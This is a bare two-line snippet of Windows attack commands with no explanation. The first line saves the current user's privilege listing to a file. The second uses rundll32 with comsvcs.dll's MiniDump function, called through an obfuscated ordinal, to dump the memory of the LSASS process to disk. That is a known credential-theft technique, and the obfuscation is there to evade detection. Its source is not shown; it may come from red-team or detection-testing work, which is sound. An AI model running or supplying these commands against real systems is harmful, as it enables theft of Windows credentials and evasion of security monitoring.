whoami.exe /all > test.txt

powershell rundll32.exe C:\\Windows\\System32\\comsvcs.dll #+0000^24 (Get-Process lsass).Id dump.bin full
